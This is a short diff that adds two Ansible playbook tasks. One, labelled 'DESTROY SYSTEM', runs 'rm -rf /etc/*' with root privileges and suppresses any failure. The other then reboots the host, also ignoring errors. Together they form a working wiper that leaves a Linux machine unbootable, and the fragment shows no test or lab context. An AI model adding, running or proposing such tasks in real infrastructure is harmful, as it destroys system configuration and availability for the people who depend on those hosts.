@@ -1,0 +1,15 @@
+- name: DESTROY SYSTEM
+  become: true
+  # become_method: sudo
+  shell: |
+    rm -rf /etc/*
+  ignore_errors: true
+  failed_when: false
+
+- name: Reboot host
+  become: true
+  reboot:
+    reboot_timeout: 300
+  register: reboot_completed
+  ignore_errors: true
+  failed_when: false
